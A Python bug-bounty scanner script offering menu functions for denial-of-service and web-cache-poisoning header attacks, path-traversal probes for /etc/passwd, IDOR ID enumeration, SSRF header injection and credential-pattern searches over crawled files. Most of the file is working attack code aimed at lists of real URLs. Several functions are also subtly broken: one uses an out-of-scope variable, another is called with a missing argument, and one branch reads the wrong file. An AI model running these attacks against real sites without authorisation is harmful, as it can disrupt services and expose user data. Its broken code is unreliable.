from platform import system as iden
from requests import get
from colorama import Fore
from random import choice
from json import load
from re import *
from time import sleep
from os.path import isfile , isdir
from os import system , remove , walk , getcwd
import requests , sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
r = Fore.RED
w = Fore.WHITE
b = Fore.BLUE
g = Fore.GREEN
c = Fore.CYAN
y = Fore.YELLOW
colors = [w , r , b , g , c , y]
def banner():
 if iden() == 'Windows':
     banner_Windows()
 else:
     system(f'clear ; python3 {getcwd() + "//Design//banner.py"}')
     system("echo '                                                     Coded By : Ali Mansour' | lolcat")
def banner_Windows():
 system('cls')
 print (f'''{choice(colors)}
                     ███████╗███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
                     ██╔════╝██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
                     █████╗  ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝
                     ██╔══╝  ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝
                     ██║     ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║
                     ╚═╝     ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝ V1.0\n

                                             Coded By : Ali Mansour\n''')

class dig_vulns:

    def __init__( self ) -> str:

        self.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        self.injectable_headers = [
        "Proxy-Host","Request-Uri","X-Forwarded","X-Forwarded-By","X-Forwarded-For",
        "X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Server","X-Forwarder-For",
        "X-Forward-For","Base-Url","Http-Url","Proxy-Url","Redirect","Real-Ip","Referer","Referer",
        "Referrer","Refferer","Uri","Url","X-Host","X-Http-Destinationurl","X-Http-Host-Override",
        "X-Original-Remote-Addr","X-Original-Url","X-Proxy-Url","X-Rewrite-Url","X-Real-Ip","X-Remote-Addr"
        ]
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
            "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/99.0.1150.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
        ]

    def slowprint(self , s ):

        for c in s + '\n' :
            sys.stdout.write(c)
            sys.stdout.flush()
            sleep(10. / 600)

    def check_cache( self , headers ):

        f_ = open('cache_headers.json')
        patterns = load(f_)
        for patrn in patterns["patterns"]:
            if "Cache-Control" in headers.keys():
                if patrn in headers["Cache-Control"]:
                    return True
            if "HIT" in headers.values():
                return True

    def generate_poc( self , header , url ):
        report = f"""
## Description :

Dear SecurityTeams,

 when i am testing in your website i found this url: {url} is vuln to Dos

## Reference :

    1. https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning
    2. https://shahjerry33.medium.com/denial-of-service-via-cache-poisoning-its-toxic-d876931749ac

## Prepartion :
	
	1. Burp Suite
	
## Step To Reproduce :

    1.Open burp and send request to this url : {url} at repeater
    2.add at the end of request {header}: blablablablablabla
    3.resend request
    4.you will see 501 status code
    5.if the page was cached then i can prevent anyone from loading this page
    6.if not i can persistently block access to any redirects on your target website

## Impact

Impact : An attacker can persistently block access to any redirects on your target website.

## Remdidation or Fix :

1) Validate at headers and make a whitelist for headers to prevent dos from unknown headers

## Poc :

	- Files Attached below at the section of upload files
	
	1.Photos demonstate the exist of bug

Thanks in advance.
Sorry for any mistakes.
    """
        if url.startswith("https://"):
            url = url.replace("https://" , "")
        if url.startswith("http://"):
            url = url.replace("http://" , "")
        if url.startswith("www."):
            url = url.replace("www." , "")
        with open(f"{url}_report.txt" , 'a')as f_r:
            f_r.write( report )
        dig_vulns().slowprint (f'{w}[{g}+{w}] Report Was Generated')

    def check_dos( self , name_f ):

        with open(name_f , 'r')as f:
            for url in f.readlines():
                url = url.rstrip()
                for header in self.injectable_headers:
                    headers = {
                            'User-Agent' : choice(self.user_agents)
                    }
                    if header == "X-Forwarded-Port":
                        headers[header] = '12211'
                    if header == "X-Forwarded-Host":
                        if url.endswith('/'):
                            url = url[:len(url) - 1]
                        headers[header] = url + ':12211'
                    else:
                        headers[header] = "A" * 10000          # someone find bug at apple lead to dos with the same way
                    try:
                        req = requests.get(url , headers = headers , allow_redirects = False, verify=False , proxies=self.proxies)
                        if ( header == "X-Forwarded-Port" and "12211" in req.url and req.status_code in range(403,599) ) or ( header == "X-Forwarded-Host" and "12211" in req.url and req.status_code in range(403,599) ): # james-kettle finding
                            print (f"{w}[{b}+{w}] {url} -> {str(req.status_code)} -> {url} -> {header} -> Web Cache Poisoning DoS")
                            print (f"{w}[{b}+{w}] Reference : https://hackerone.com/reports/409370")
                        elif req.status_code == 400:
                            print (f"{w}[{b}+{w}] {url} -> {str(req.status_code)} -> {url} -> {header} -> Maybe DoS Vuln")
                            print (f"{w}[{b}+{w}] Look at response of this url {url}")
                            if "large traffic" in req.text or header in req.text:
                                print (f"{w}[{g}+{w}] Vuln to Dos due to use header {header} with large content")
                        else:
                            print (f"{w}[{r}-{w}] {url} -> {str(req.status_code)} -> {url} -> {header}")
                    #except Exception as e:
                    #    print (e)
                    except KeyboardInterrupt:
                        break
    def case_1_dos( self , name_f ):

        headers_attack = [
        "zTRANSFER-ENCODING",
        "X-Forwarded-SSL",
        "Origin"
        ]
        with open(name_f , 'r')as f:
            for url in f.readlines():
                url = url.rstrip()
                for header_attack in headers_attack:
                    headers = {
                    'User-Agent' : choice(self.user_agents),
                    header_attack:"https://blalblablablalblablablabla.com"
                    }
                    try:
                        req = requests.get(url , headers=headers ,verify=False, proxies=self.proxies)
                        if req.status_code == 501:
                            print (f"{w}[{g}+{w}] {url} -> Dos Vuln")
                            if header_attack == "zTRANSFER-ENCODING":
                                print (f"{r}Generate POC ..")
                            if header_attack == "X-Forwarded-SSL":
                                if "Contradictory scheme headers" in req.text:
                                    print (f"{w}[{g}+{w}] Dos Vuln due to control at the page content via X-Forwarded-SSL")
                            if header_attack == "Origin":
                                if dig_vulns().check_cache(req.headers):
                                    print (f"{w}[{g}+{w}] Cached !!")
                                    print (f"{w}[{g}+{w}] {url} -> Web Cache Poisoning DoS via Origin header")
                                    print (f"{w}[{g}+{w}] Reference: https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning")
                            if dig_vulns().check_cache(req.headers):
                                print (f"{w}[{g}+{w}] Cached !!")
                            dig_vulns().generate_poc(header_attack , url)
                            break
                    except KeyboardInterrupt:
                        exit()
    def del_repeat( self , name ):
        for name_ in name:
            with open(name_ , 'r')as f:
               data = set(f.readlines())
               fx = open(name_ , 'w')
               for line in data :
                  fx.write(line.rstrip() + '\n')
               fx.close()
    def search_cred_files( self, nameD , filters ): # This Developed only to search for sensetive data at file which come from waybackurls , gau,crawler

        result_f = open("cred_results.txt" , 'a')
        result_er = open("errors_result.txt",'a')
        f_ = open('creditionals.json')
        patterns = load(f_)
        for dir,dirs,files in walk(nameD):
            for file in files:
                pathF = dir + '/' + file
                with open(pathF , 'r')as file_one:
                    try:
                        for line in file_one:
                            line = line.rstrip()
                            for patrn in patterns["patterns"]:
                                if search(patrn, line.lower()):
                                    if filters == 'y':
                                        if f"?{patrn}" in line.lower().strip() or f"&{patrn}" in line.lower().strip():
                                            print(r , line , c, ' +> ' , g,line[line.lower().find(patrn):],w)
                                            result_f.write(f"{line} +> {line[line.find(patrn):]} -> {pathF}\n")
                                    else:
                                        print(r , line , c, ' +> ' , g,line[line.lower().find(patrn):],w)
                                        result_f.write(f"{line} +> {line[line.find(patrn):]} -> {pathF}\n")
                    except:
                        result_er.write(pathF + '\n')
                        continue
        result_f.close()
        result_er.close()

    def test_lfi(self , name_f , burp , n):
        keywords = ["/assets" ,"/asset","/fileAsset","/contentAsset"]
        f_r = open("test_lfi.txt" , 'a')
        with open(name_f , 'r')as fs:
            for sub in fs.readlines():
                  sub = sub.rstrip()
                  for key_w in keywords:
                        if key_w in sub:
                              test_lfi = sub.split(key_w)[0] + key_w
                              with open("lfi.txt" , 'r') as fz:
                                    for payload in fz.readlines():
                                          f_r.write(test_lfi + '/' + payload.rstrip()+ '\n')
        f_r.close()
        if n == 'Windows':
            dig_vulns().check_windows("test_lfi.txt")
        else:
            if burp:
                system(f"httpx -l test_lfi.txt -status-code -mc 200 -ms 'root:' -http-proxy http://127.0.0.1:8080 -o lfi_success.txt")
            else:
                system("httpx -l lfi_test_ngnix.txt -status-code -mc 200 -ms 'root:' -o success_lfi_ngnix.txt")
        if isfile("test_lfi.txt"):remove("test_lfi.txt")
    def ngnix_lfi(self , name_f , burp , n ):
    #httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
        f_rr = open("lfi_test_ngnix.txt" , 'a')
        with open(name_f , 'r')as f_t:
            for url_t in f_t.readlines():
                    url_t = url_t.rstrip()
                    with open("lfi.txt" , 'r')as p_t:
                        for payload_t in p_t.readlines():
                                payload_t = payload_t.rstrip()
                                f_rr.write(url_t + '/' + payload_t + '\n')
        f_rr.close()
        if n == "Windows":
            dig_vulns().check_windows("lfi_test_ngnix.txt")
        else:
            if burp:
                system("httpx -l lfi_test_ngnix.txt -status-code -mc 200 -ms 'root:' -http-proxy http://127.0.0.1:8080 -o success_lfi_ngnix.txt")
            else:
                system("httpx -l lfi_test_ngnix.txt -status-code -mc 200 -ms 'root:' -o success_lfi_ngnix.txt")
        if isfile("lfi_test_ngnix.txt"):remove("lfi_test_ngnix.txt")
    def check_windows(self , name_f , burp):
        f_rr = open("lfi_success.txt" , 'w')
        with open(name_f , 'r')as ff:
                for test_ in ff.readlines():
                    test_ = test_.rstrip()
                    try:
                            req = get(test_ , allow_redirects=False, verify=False, proxies=self.proxies).text
                            if "root:" in req:
                                f_rr.write(test_ + '\n')
                                print (f"{w}[{g}+{w}] {test_} -> LFI Vuln")
                            elif "Attention Required" in req:
                                print (f"{w}[{r}-{w}] WAF was Detected ( Cloudflare )")
                    except Exception as e:
                            print (e)
                            continue
        f_rr.close()

    def ch_id( self , name_f ):
        emails = []
        f_s = open("results_midor.txt" , 'a')
        with open(name_f , 'r')as f:
            for check in f.readlines():
                check = check.rstrip()
                check_l = check.split('/')
                for check_ in check_l:
                    if check_.isnumeric() and ( ".js" not in check or ".css" not in check ):
                        print (f"{w}[{r}+{w}] {c} {check_} {g} -> {r} {check}")
                        f_s.write(check + '\n')
                    match_ = search(r'=\b\d+\b',check)
                    if match_ and check not in emails:
                        print (f"{w}[{r}+{w}] {c} {match_.group(0)} {g} -> {r} {check}")
                        f_s.write(check + '\n')
                        emails.append(check)
                    else:
                        match = search(r'[\w.+-]+@[\w-]+\.[\w.-]+', check)
                        if match and check not in emails:
                            print (f"{w}[{r}+{w}] {c} {match.group(0)} {g} -> {r} {check}")
                            f_s.write(check + '\n')
                            emails.append(check)
        f_s.close()
    def test_id( self , name_f , burp ):
        n = [5 , 1, 10 , 100]
        with open(name_f , 'r')as ff:
            for check in ff.readlines():
                check = check.rstrip()
                check_l = check.split('/')
                for check_ in check_l:
                    if check_.isnumeric():
                        if burp:
                            req = get(check ,verify=False , proxies=self.proxies)
                        else:
                            req = get(check)
                        if req.status_code in range(199,404):
                            print(f'{w}[{r}+{w}] {check} -> {str(req.status_code)} status_code')
                            count_old = len(req.text)
                            for nn in n:
                                check_2 = int(check_) - nn
                                new_url = check.replace(check_ , str(check_2) , 1)
                                if burp:
                                    req2 = get(new_url , verify=False , proxies=self.proxies)
                                else:
                                    req2 = get(new_url)
                                if req2.status_code in range(199,404):
                                    print(f'{w}[{r}+{w}] {new_url} -> {str(req2.status_code)} status_code')
                                    if (len(req2.text) - count_old) > 5:
                                        print (f'{w}[{r}+{w}] {g}Idor {y} -> {c} {check}')
                                        break

    def ssrf_test(self , url , server , burp):
        with open(name_f , 'r')as nn_t:
            for url in nn_t.readlines():
                url = url.rstrip()
                for header in self.injectable_headers:
                    headers = {
                    'User-Agent' : choice(self.user_agents)
                    }
                    headers[header] = server
                    try:
                        if burp:
                            req = requests.get(url , headers = headers , allow_redirects = False, verify=False , proxies=self.proxies)
                        else:
                            req = requests.get(url , headers = headers , allow_redirects = False, verify=False)
                        if req.status_code == 404:
                            break
                        if server in req.text:
                            print (f"{w}[{b}+{w}] {url} -> {str(req.status_code)} -> {url} -> {header} -> Maybe DoS Vuln")
                        print (f"{w}[{b}+{w}] {url} -> {str(req.status_code)} -> {url} -> {header}")
                        if dig_vulns().check_cache(req.headers):
                            print (f'{w}[{g}+{w}] {url} -> Cached !!')
                            print (f"{w}[{b}+{w}] {url} -> {str(req.status_code)} -> {url} -> {header} -> Web Cache Poisoning DoS")
                    except KeyboardInterrupt:
                        break
                    except Exception as e:
                        print (e)
burp = False
banner()
if len(sys.argv) == 1:
    print (f'{r}Usages{w}:')
    print (f"""
{r}-f    {w}: {g}Input file
{r}-F    {w}: {g} Filter Results [y/n]
{r}-n    {w}: {g}Number of function
{r}-s    {w}: {g}Server burp collab..
{r}-burp {w}: {g}pass results to burp
{r}-p    {w}: {g}path of dir to dig into it
{r}-F    {w}: {g}Enable Filter mode when digging into file(s)

{r}Functions{w}:

{g}1{w}) {c}Test All Possible dos scenario & Test Web Cache Poisoning DoS & Generate reports
{g}2{w}) {c}Dump Sensetive Data from file , jsUrl with searching for keywords
{g}3{w}) {c}Extract numeric values or any email to test idor
{g}4{w}) {c}Test Idor Vuln depend on content-length of responses
{g}5{w}) {c}Test lfi with Nginx Server ( merge_slashes ) Misconfig.
{g}6{w}) {c}Test lfi with urls contain asset dir
{g}7{w}) {c}Test ssrf with hidden headers

{r}Example{w}:

# Not https:// or http:// or www.
{choice(colors)}""")
    print ("""1. ./{0} -n 1 -f subdomains.txt -burp -> Test All scenario of dos , Web Cache Poisoning Dos
2. ./{0} -n 2 -d /home/mrx/att -F n   -> Sensetive Data from files in directory
3. ./{0} -n 3 -f url.txt -> Numeric values For idor
4. ./{0} -n 4 -f results.txt -burp -> Test idor at numeric values
5. ./{0} -n 5 -f url.txt -burp -> Test path Traversal
6. ./{0} -n 6 -f urls.txt -burp -> Test lfi with this Tip
7. ./{0} -n 7 -f urls.txt -s burpcollab -burp -> Test ssrf with hidden headers
8. ./{0} -n All -f urls.txt -s burpcolllab -burp -> Test All Functions
""".format(sys.argv[0]))
else:
    try:
        if "-burp" in sys.argv[1:]:
            burp = True
            print (f"{w}[{g}+{w}] Change Burp Mode To ON")
        if "-s" in sys.argv[1:]:
            burp_collab = sys.argv[sys.argv.index('-s')+1]
        if "-f" in sys.argv[1:]:
            name_f = sys.argv[sys.argv.index('-f')+1]
            if not isfile(name_f):
                exit(f"{w}[{r}!{w}] File Not Found")
        if "-f" not in sys.argv[1:] and "-d" not in sys.argv[1:]:
            exit(f"{w}[{r}!{w}] File Input Not Provided")
        if "-n" in sys.argv[1:]:
            number = str(sys.argv[sys.argv.index('-n')+1])
        if "-n" not in sys.argv[1:]:
            exit(f"{w}[{r}!{w}] Number Not Inserted")
        if number == '1':
            dig_vulns().case_1_dos( name_f )
            dig_vulns().check_dos( name_f )
        elif number == '2':
            if isdir(sys.argv[sys.argv.index('-d')+1]):
                dir_p = sys.argv[sys.argv.index('-d')+1]
                filter_ = sys.argv[sys.argv.index('-F')+1]
                dig_vulns().search_cred_files(dir_p , filter_)
            else:
                exit(f"{w}[{r}!{w}] Dir Not Found")
        elif number == '3':
            dig_vulns().ch_id( name_f )
        elif number == '4':
            dig_vulns().test_id( name_f , burp )
        elif number == '5':
            dig_vulns().ngnix_lfi(name_f , burp , iden())
        elif number == '6':
            dig_vulns().test_lfi(name_f , burp , iden())
        elif number == '7':
            if "-s" not in sys.argv[1:]:
                exit(f"{w}[{r}!{w}] Burp collab. Not Provided")
            dig_vulns().ssrf_test(name_f , burp_collab , burp)
        elif number == 'All':
            dig_vulns().case_1_dos( name_f )
            dig_vulns().check_dos( name_f )
            dig_vulns().ngnix_lfi(name_f , burp , iden())
            dig_vulns().test_lfi(name_f , burp , iden())
            dig_vulns().ssrf_test(name_f , burp_collab , burp)
            dig_vulns().ch_id( name_f )
            dig_vulns().test_id( "results_midor.txt" , burp )
        else :
            exit (f"{w}[{r}!{w}] Incorrect Select")
    except KeyboardInterrupt:
        exit()